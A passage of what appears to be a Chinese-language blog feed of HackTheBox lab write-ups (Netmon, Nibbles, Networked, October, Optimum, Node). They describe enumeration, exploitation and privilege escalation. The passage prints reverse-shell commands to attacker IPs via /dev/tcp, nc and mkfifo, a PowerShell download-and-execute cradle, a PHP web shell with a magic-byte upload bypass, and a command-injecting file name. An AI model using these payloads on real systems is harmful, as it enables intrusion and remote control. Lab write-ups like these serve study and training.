<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@raspberrypi:&#x2F;media&#x2F;usbstick# df -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">aufs            8.5G  2.8G  5.3G  35% &#x2F;</span><br><span class="line">tmpfs           100M  4.8M   96M   5% &#x2F;run</span><br><span class="line">&#x2F;dev&#x2F;sda1       1.3G  1.3G     0 100% &#x2F;lib&#x2F;live&#x2F;mount&#x2F;persistence&#x2F;sda1</span><br><span class="line">&#x2F;dev&#x2F;loop0      1.3G  1.3G     0 100% &#x2F;lib&#x2F;live&#x2F;mount&#x2F;rootfs&#x2F;filesystem.squashfs</span><br><span class="line">tmpfs           250M     0  250M   0% &#x2F;lib&#x2F;live&#x2F;mount&#x2F;overlay</span><br><span class="line">&#x2F;dev&#x2F;sda2       8.5G  2.8G  5.3G  35% &#x2F;lib&#x2F;live&#x2F;mount&#x2F;persistence&#x2F;sda2</span><br><span class="line">devtmpfs         10M     0   10M   0% &#x2F;dev</span><br><span class="line">tmpfs           250M  8.0K  250M   1% &#x2F;dev&#x2F;shm</span><br><span class="line">tmpfs           5.0M  4.0K  5.0M   1% &#x2F;run&#x2F;lock</span><br><span class="line">tmpfs           250M     0  250M   0% &#x2F;sys&#x2F;fs&#x2F;cgroup</span><br><span class="line">tmpfs           250M  8.0K  250M   1% &#x2F;tmp</span><br><span class="line">&#x2F;dev&#x2F;sdb        8.7M   93K  7.9M   2% &#x2F;media&#x2F;usbstick</span><br><span class="line">tmpfs            50M     0   50M   0% &#x2F;run&#x2F;user&#x2F;999</span><br><span class="line">tmpfs            50M     0   50M   0% &#x2F;run&#x2F;user&#x2F;1000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@raspberrypi:&#x2F;media&#x2F;usbstick# mount</span><br><span class="line">sysfs on &#x2F;sys type sysfs (rw,nosuid,nodev,noexec,relatime)</span><br><span class="line">proc on &#x2F;proc type proc (rw,nosuid,nodev,noexec,relatime)</span><br><span class="line">tmpfs on &#x2F;run type tmpfs (rw,nosuid,relatime,size&#x3D;102396k,mode&#x3D;755)</span><br><span class="line">&#x2F;dev&#x2F;sda1 on &#x2F;lib&#x2F;live&#x2F;mount&#x2F;persistence&#x2F;sda1 type iso9660 (ro,noatime)</span><br><span class="line">&#x2F;dev&#x2F;loop0 on &#x2F;lib&#x2F;live&#x2F;mount&#x2F;rootfs&#x2F;filesystem.squashfs type squashfs (ro,noatime)</span><br><span class="line">tmpfs on &#x2F;lib&#x2F;live&#x2F;mount&#x2F;overlay type tmpfs (rw,relatime)</span><br><span class="line">&#x2F;dev&#x2F;sda2 on &#x2F;lib&#x2F;live&#x2F;mount&#x2F;persistence&#x2F;sda2 type ext4 (rw,noatime,data&#x3D;ordered)</span><br><span class="line">aufs on &#x2F; type aufs (rw,noatime,si&#x3D;75eb8ac9,noxino)</span><br><span class="line">devtmpfs on &#x2F;dev type devtmpfs (rw,nosuid,size&#x3D;10240k,nr_inodes&#x3D;58955,mode&#x3D;755)</span><br><span class="line">securityfs on &#x2F;sys&#x2F;kernel&#x2F;security type securityfs (rw,nosuid,nodev,noexec,relatime)</span><br><span class="line">tmpfs on &#x2F;dev&#x2F;shm type tmpfs (rw,nosuid,nodev)</span><br><span class="line">devpts on &#x2F;dev&#x2F;pts type devpts (rw,nosuid,noexec,relatime,gid&#x3D;5,mode&#x3D;620,ptmxmode&#x3D;000)</span><br><span class="line">tmpfs on &#x2F;run&#x2F;lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size&#x3D;5120k)</span><br><span class="line">tmpfs on &#x2F;sys&#x2F;fs&#x2F;cgroup type tmpfs (ro,nosuid,nodev,noexec,mode&#x3D;755)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent&#x3D;&#x2F;lib&#x2F;systemd&#x2F;systemd-cgroups-agent,name&#x3D;systemd)</span><br><span class="line">pstore on &#x2F;sys&#x2F;fs&#x2F;pstore type pstore (rw,nosuid,nodev,noexec,relatime)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)</span><br><span class="line">systemd-1 on &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;binfmt_misc type autofs (rw,relatime,fd&#x3D;22,pgrp&#x3D;1,timeout&#x3D;300,minproto&#x3D;5,maxproto&#x3D;5,direct)</span><br><span class="line">hugetlbfs on &#x2F;dev&#x2F;hugepages type hugetlbfs (rw,relatime)</span><br><span class="line">debugfs on &#x2F;sys&#x2F;kernel&#x2F;debug type debugfs (rw,relatime)</span><br><span class="line">mqueue on &#x2F;dev&#x2F;mqueue type mqueue (rw,relatime)</span><br><span class="line">tmpfs on &#x2F;tmp type tmpfs (rw,nosuid,nodev,relatime)</span><br><span class="line">&#x2F;dev&#x2F;sdb on &#x2F;media&#x2F;usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data&#x3D;ordered)</span><br><span class="line">tmpfs on &#x2F;run&#x2F;user&#x2F;999 type tmpfs (rw,nosuid,nodev,relatime,size&#x3D;51200k,mode&#x3D;700,uid&#x3D;999,gid&#x3D;997)</span><br><span class="line">tmpfs on &#x2F;run&#x2F;user&#x2F;1000 type tmpfs (rw,nosuid,nodev,relatime,size&#x3D;51200k,mode&#x3D;700,uid&#x3D;1000,gid&#x3D;1000)</span><br></pre></td></tr></table></figure>

<p>flag在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings &#x2F;dev&#x2F;sdb</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Netmon</title>
    <url>/2020/07/02/HTB-Netmon/</url>
    <content><![CDATA[<h1 id="Netmon"><a href="#Netmon" class="headerlink" title="Netmon"></a>Netmon</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Netmon/1.jpg" alt="1"></p>
<p>扫描发现ftp、smb、http服务<br>而且ftp运行匿名登录，好像共享了整个主硬盘</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口主页运行着network monitor</p>
<p><img src="/images/Netmon/2.jpg" alt="2"></p>
<p>尝试获取配置文件，谷歌<code>network monitor configuration file</code>搜索配置文件位置</p>
<p><img src="/images/Netmon/3.jpg" alt="3"></p>
<p>读取配置文件</p>
<p><img src="/images/Netmon/4.jpg" alt="4"></p>
<p>找到账户密码<br><code>prtgadmin/PrTg@dmin2019</code></p>
<p><img src="/images/Netmon/5.jpg" alt="5"></p>
<p>成功登录</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞<br>searchsploit里只找到xss和dos<br>谷歌都是找到了，漏洞编号CVE-2018-9276</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p><a href="https://github.com/M4LV0/PRTG-Network-Monitor-RCE">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;prtg-exploit.sh -u http:&#x2F;&#x2F;10.10.10.152 -c &quot;_ga&#x3D;GA1.4.82101342.1593691949; _gid&#x3D;GA1.4.1955629339.1593691949; OCTOPUS1813713946&#x3D;ezhGMDBGQTBCLTg4MUMtNDVDRS04Mzk2LTdCRDNCNDg4NEJENH0%3D&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Netmon/8.jpg" alt="8"></p>
<p>该脚本给出了提示，需要使用c参数指定完成登录的cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.py pentest:&#39;P3nT3st!&#39;@10.10.10.152</span><br></pre></td></tr></table></figure>

<p><img src="/images/Netmon/9.jpg" alt="9"></p>
<h3 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h3><p>手动利用位置</p>
<p><img src="/images/Netmon/10.jpg" alt="10"></p>
<p>接着</p>
<p><img src="/images/Netmon/6.jpg" alt="6"></p>
<p>添加指令</p>
<p><img src="/images/Netmon/11.jpg" alt="11"></p>
<p><img src="/images/Netmon/12.jpg" alt="12"></p>
<p>先使用tcpdump配合对方ping命令，检测RCE是否成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -i tun0 icmp</span><br></pre></td></tr></table></figure>

<p><img src="/images/Netmon/13.jpg" alt="13"></p>
<p>发现检测到了imcp包，说明RCE成功</p>
<p>不过常规的反弹powershell没有生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p>可能是某些闭合的原因造成，具体也不清楚，不过可以使用powershell自带的base64编码解决</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE | base64 -w0</span><br></pre></td></tr></table></figure>

<p>复制这段添加到payload，主要是利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -enc</span><br><span class="line">powershell -E</span><br></pre></td></tr></table></figure>

<p>这两个参数一个意思</p>
<p><img src="/images/Netmon/14.jpg" alt="14"></p>
<p>成功获取shell</p>
<p><img src="/images/Netmon/15.jpg" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Nibbles</title>
    <url>/2020/06/10/HTB-Nibbles/</url>
    <content><![CDATA[<h1 id="Nibbles"><a href="#Nibbles" class="headerlink" title="Nibbles"></a>Nibbles</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Nibbles/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问80端口</p>
<p><img src="/images/Nibbles/2.jpg" alt="2"></p>
<p>源代码提示了一个目录</p>
<p><img src="/images/Nibbles/4.jpg" alt="4"></p>
<p>看来运行的是一个博客系统，叫Nibbleblog，版本4.0.3<br>尝试搜寻公开漏洞</p>
<p><img src="/images/Nibbles/6.jpg" alt="6"></p>
<p>只发现一个metasploit有一个文件上传漏洞，不过需要用户账户和密码</p>
<p>我尝试进行目录枚举，看能否发现更多信息</p>
<p><img src="/images/Nibbles/5.jpg" alt="5"></p>
<p>发现了admin.php的一个登录页面</p>
<p><img src="/images/Nibbles/7.jpg" alt="7"></p>
<p>我尝试进行暴力破解，不过一会儿就给我拉进黑名单了<br>所以只能手动尝试</p>
<p><img src="/images/Nibbles/8.jpg" alt="8"></p>
<p>之后在这个网站进行一些收集，使用弱口令登录成功</p>
<p>账户/密码:<code>nibbles/nibbles</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="后台上传"><a href="#后台上传" class="headerlink" title="后台上传"></a>后台上传</h3><p><img src="/images/Nibbles/9.jpg" alt="9"></p>
<p>找到了上传点</p>
<p><img src="/images/Nibbles/10.jpg" alt="10"></p>
<p>上传phpshell成功，而且根据首页image可以推测出路径位置<code>10.10.10.75/nibbleblog/content/private/plugins/my_image/</code><br>不过访问shell似乎不能成功</p>
<p><img src="/images/Nibbles/11.jpg" alt="11"></p>
<p>后来去查看了一下metasploit脚本是怎么写的: <a href="https://www.exploit-db.com/exploits/38489">链接</a></p>
<p><img src="/images/Nibbles/12.jpg" alt="12"></p>
<p>shell要修改为image.php，看来是存在白名单</p>
<p>之后就可以成功获取shell</p>
<p><img src="/images/Nibbles/13.jpg" alt="13"></p>
<p>顺手升级为交互shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Nibbles/14.jpg" alt="14"></p>
<p>我发现在我用户的主目录下存在能以root权限执行的shell脚本，说明我具有w权限<br>过去发现没目录没文件，自己建就好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.132&#x2F;5555 0&gt;&amp;1&quot;&#39; &gt; monitor.sh</span><br><span class="line">sudo .&#x2F;monitor.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Nibbles/15.jpg" alt="15"></p>
<p>即可获取root</p>
<p>这里有一个问题，如果不用bash -c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.132&#x2F;5555 0&gt;&amp;1&quot; &gt; monitor.sh</span><br></pre></td></tr></table></figure>

<p>会报错:<code>Syntax error: Bad fd number</code></p>
<p><img src="/images/Nibbles/16.jpg" alt="16"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Networked</title>
    <url>/2020/06/28/HTB-Networked/</url>
    <content><![CDATA[<h1 id="Networked"><a href="#Networked" class="headerlink" title="Networked"></a>Networked</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Networked/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>主页没啥发现</p>
<p><img src="/images/Networked/2.jpg" alt="2"></p>
<p>开始目录枚举</p>
<p><img src="/images/Networked/3.jpg" alt="3"></p>
<p>发现了备份压缩包，下载并解压</p>
<p><img src="/images/Networked/4.jpg" alt="4"></p>
<p>该页面提示了4个页面，访问确认页面存在</p>
<p><img src="/images/Networked/5.jpg" alt="5"></p>
<p>看来有文件上传可以利用</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="文件上传bypass"><a href="#文件上传bypass" class="headerlink" title="文件上传bypass"></a>文件上传bypass</h3><p>开始进行代码审计</p>
<p>首先是对文件名后缀的限制</p>
<p><img src="/images/Networked/6.jpg" alt="6"></p>
<p>文件类型检查</p>
<p><img src="/images/Networked/13.jpg" alt="13"></p>
<p>检查魔术字节确认文件类型</p>
<p><img src="/images/Networked/7.jpg" alt="7"></p>
<p>开始攻击</p>
<p>如果不修改魔术字节</p>
<p><img src="/images/Networked/8.jpg" alt="8"></p>
<p>上传失败<br>添加魔术字节，可以在如下网址查看到各类型的魔术字节</p>
<p><a href="https://tool.lu/magicbytes/%E6%88%96%E8%80%85https://en.wikipedia.org/wiki/List_of_file_signatures">https://tool.lu/magicbytes/或者https://en.wikipedia.org/wiki/List_of_file_signatures</a></p>
<p>使用010editor手动添加jpg的magic bytes</p>
<p><img src="/images/Networked/10.jpg" alt="10"></p>
<p>尝试上传</p>
<p><img src="/images/Networked/9.jpg" alt="9"></p>
<p>回显提示上传成功<br>在<code>photos.php</code>页面，找到上传路径</p>
<p><img src="/images/Networked/11.jpg" alt="11"></p>
<p>访问路径，发现php代码在.jpg结尾下竟然执行了 ，应该是存在某个解析漏洞</p>
<p><img src="/images/Networked/12.jpg" alt="12"></p>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>现在只要写个shell即可</p>
<p><code>shell.php</code> 一句话木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  system($_REQUEST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>添加magicbytes</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;FF D8&#39; | xxd -p -r &gt; mime_shell.php.jpg</span><br><span class="line">cat shell.php.jpg &gt;&gt; mime_shell.php.jpg</span><br></pre></td></tr></table></figure>

<p>上传访问，确认可以执行</p>
<p><img src="/images/Networked/14.jpg" alt="14"></p>
<p>最后url编码执行反弹shell命令payload</p>
<p><img src="/images/Networked/15.jpg" alt="15"></p>
<p>成功getshell</p>
<p><img src="/images/Networked/16.jpg" alt="16"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现了文件corntab.guly</p>
<p><img src="/images/Networked/17.jpg" alt="17"></p>
<p>是个计划任务</p>
<p>每三分钟运行一次check_attack.php</p>
<p><img src="/images/Networked/18.jpg" alt="18"></p>
<p>这个文件存在漏洞</p>
<p>$value变量存放文件名，它会调用exec执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;rm -f &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;$value</span><br></pre></td></tr></table></figure>

<p>如果我们在那个文件夹建一个文件，文件名包含<code>;</code>来截断命令，系统会执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;rm -f &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;;evilpayload;</span><br></pre></td></tr></table></figure>

<p>所以执行操作(恰巧系统nc带危险c和e参数，不过文件名不能包含/，所以只能用c参数)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads</span><br><span class="line">touch &quot;;nc -c bash 10.10.16.100 5555;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Networked/19.jpg" alt="19"></p>
<p>成功获取用户guly</p>
<p><img src="/images/Networked/20.jpg" alt="20"></p>
<p>发现能以root运行的shell脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash -p</span><br><span class="line">cat &gt; &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-guly &lt;&lt; EoF</span><br><span class="line">DEVICE&#x3D;guly0</span><br><span class="line">ONBOOT&#x3D;no</span><br><span class="line">NM_CONTROLLED&#x3D;no</span><br><span class="line">EoF</span><br><span class="line"></span><br><span class="line">regexp&#x3D;&quot;^[a-zA-Z0-9_\ &#x2F;-]+$&quot;</span><br><span class="line"></span><br><span class="line">for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do</span><br><span class="line">        echo &quot;interface $var:&quot;</span><br><span class="line">        read x</span><br><span class="line">        while [[ ! $x &#x3D;~ $regexp ]]; do</span><br><span class="line">                echo &quot;wrong input, try again&quot;</span><br><span class="line">                echo &quot;interface $var:&quot;</span><br><span class="line">                read x</span><br><span class="line">        done</span><br><span class="line">        echo $var&#x3D;$x &gt;&gt; &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-guly</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">&#x2F;sbin&#x2F;ifup guly0</span><br></pre></td></tr></table></figure>

<p>发现是一个网络配置文件，在网上能找到提权方式 <a href="https://seclists.org/fulldisclosure/2019/Apr/24">链接</a></p>
<p>这个提权比较有意思，利用了下面这样的特性，发现命令执行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#a&#x3D;test</span><br><span class="line">root@kali:~#echo $a</span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">root@kali:~#a&#x3D;test id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>

<p>而上面的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regexp&#x3D;&quot;^[a-zA-Z0-9_\ &#x2F;-]+$&quot;			\ 表示允许使用空格</span><br></pre></td></tr></table></figure>

<p>所以我猜，应该是最后的<code>/sbin/ifup guly0</code>触发了上面的特性，得到了RCE</p>
<p>输入信息加空格bash，就可以获得root shell</p>
<p><img src="/images/Networked/21.jpg" alt="21"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:October</title>
    <url>/2020/10/19/HTB-October/</url>
    <content><![CDATA[<h1 id="October"><a href="#October" class="headerlink" title="October"></a>October</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/October/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动访问80</p>
<p><img src="/images/October/2.png" alt="2"></p>
<p>发现october cms</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接搜索公开漏洞</p>
<p><img src="/images/October/3.png" alt="3"></p>
<p>唯一有用的可能是41936</p>
<p><img src="/images/October/4.png" alt="4"></p>
<p>发现上传绕过 ，通过添加后缀php5，开始寻找上传点</p>
<p>进行目录扫描</p>
<p><img src="/images/October/6.png" alt="6"></p>
<p>发现backend，那个是登录后台登录页面</p>
<p><img src="/images/October/7.png" alt="7"></p>
<p>这里有点麻烦，枚举的线程多了会有问题，其实不用枚举也可以，有一个奇怪的现象，前台注册账号后，会跳转到这个页面</p>
<p><img src="/images/October/5.png" alt="5"></p>
<p>通过一些搜索可以找到默认登录凭据<code>admin/admin</code></p>
<p>之后可以成功登录，找到上传点，并且提醒了php5扩展名</p>
<p><img src="/images/October/8.png" alt="8"></p>
<p>上传shell</p>
<p><img src="/images/October/9.png" alt="9"></p>
<p>直接给出了路径</p>
<p><img src="/images/October/10.png" alt="10"></p>
<p>获取RCE，这样就能反弹shell了</p>
<p><img src="/images/October/11.png" alt="11"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Optimum</title>
    <url>/2020/06/09/HTB-Optimum/</url>
    <content><![CDATA[<h1 id="Optimum"><a href="#Optimum" class="headerlink" title="Optimum"></a>Optimum</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Optimum/1.jpg" alt="1"></p>
<p>只有80端口开放，运行这HFS 2.3，是一个类似于FTP的文件管理服务</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><p><code>windows/http/rejetto_hfs_exec</code></p>
<p><img src="/images/Optimum/2.jpg" alt="2"></p>
<h3 id="不使用msf"><a href="#不使用msf" class="headerlink" title="不使用msf"></a>不使用msf</h3><p><img src="/images/Optimum/3.jpg" alt="3"></p>
<p>只有一个py，所以我决定使用39161.py</p>
<p><img src="/images/Optimum/4.jpg" alt="4"></p>
<p>说明里写了你需要在80端口存放<code>nc.exe</code></p>
<p><img src="/images/Optimum/5.jpg" alt="5"></p>
<p>接着修改本机地址</p>
<p>修改两处后运行脚本</p>
<p><img src="/images/Optimum/6.jpg" alt="6"></p>
<p>成功获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>执行<code>systeminfo</code>保存到提权脚本</p>
<p><img src="/images/Optimum/7.jpg" alt="7"></p>
<p>使用MS16-098提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\10.10.16.132\a\bfill.exe</span><br><span class="line">.\bfill.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Optimum/8.jpg" alt="8"></p>
<p>另外Powershell MS16-032测试后也是可以的</p>
<p><a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1</a></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Node</title>
    <url>/2020/06/24/HTB-Node/</url>
    <content><![CDATA[<h1 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/node/1.jpg" alt="1"></p>
<p>可以发现22 SSH和3000 HTTP服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>从http服务进行枚举</p>
<p>先进行目录扫描，神奇的是一个目录都没有扫描出来，这是不正常的<br>很明显目标正在阻止我们的扫描，用burp转发，抓包进行分析</p>
<p>这是dirbuster的包</p>
<p><img src="/images/node/2.jpg" alt="2"></p>
<p>这是一个正常数据包</p>
<p><img src="/images/node/3.jpg" alt="3"></p>
<p>对比发现UA可能是被过滤的原因</p>
<p><img src="/images/node/4.jpg" alt="4"></p>
<p>修改UA后数据包正常，所以也许应该修改UA再进行枚举</p>
<p><img src="/images/node/5.jpg" alt="5"></p>
<p>不过我们又遇到了问题</p>
<p><img src="/images/node/6.jpg" alt="6"></p>
<p>虽然程序跑起来了，但是对方会对我的任何回应返回网页的主页，这下只能放弃枚举了</p>
<p>尝试使用burpsuite爬虫，看看能发现什么有用信息</p>
<p><img src="/images/node/7.jpg" alt="7"></p>
<p>发现了目录api/users，里面存放了加密的敏感信息</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>破解密码，得到账号密码组合<code>myP14ceAdm1nAcc0uNT/manchester</code>，执行登录</p>
<p><img src="/images/node/8.jpg" alt="8"></p>
<p>登录后，提示下载文件，进行下载</p>
<p><img src="/images/node/9.jpg" alt="9"></p>
<p>文件进行过base64编码，进行解码，顺便看看新的文件的文件类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64 -d myplace.backup &gt; new.backup</span><br><span class="line">file new.backup</span><br></pre></td></tr></table></figure>

<p><img src="/images/node/10.jpg" alt="10"></p>
<p>是一个zip压缩包，尝试解压</p>
<p>坑爹 ，还带密码，尝试破解密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u new.zip</span><br></pre></td></tr></table></figure>

<p>破解出密码<code>magicword</code></p>
<p>解压    </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unzip new.zip</span><br><span class="line">magicword</span><br></pre></td></tr></table></figure>

<p>在众多文件中，发现了疑似账号密码的信息<code>mark/5AYRft73VtFpc84k</code>，尝试连接ssh</p>
<p><img src="/images/node/11.jpg" alt="11"></p>
<p><img src="/images/node/12.jpg" alt="12"></p>
<p>成功连接</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>内核提权</p>
<p>目标为ubuntu 4.0.4</p>
<p><img src="/images/node/13.jpg" alt="13"></p>
<p>提权成功</p>
<p><img src="/images/node/14.jpg" alt="14"></p>
<p>方法2</p>
<p>发现tom账号正在运行数据库</p>
<p><img src="/images/node/15.jpg" alt="15"></p>
<p>登录进数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mongo -u mark scheduler -p</span><br><span class="line">5AYRft73VtFpc84k</span><br></pre></td></tr></table></figure>

<p>插入reverse_shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.tasks.insertOne( &#123; &quot;cmd&quot;:&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|&#x2F;bin&#x2F;nc 10.10.16.99 4444 &gt;&#x2F;tmp&#x2F;f&quot;&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/node/16.jpg" alt="16"></p>
<p>获取shell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:OpenAdmin</title>
    <url>/2020/10/26/HTB-OpenAdmin/</url>
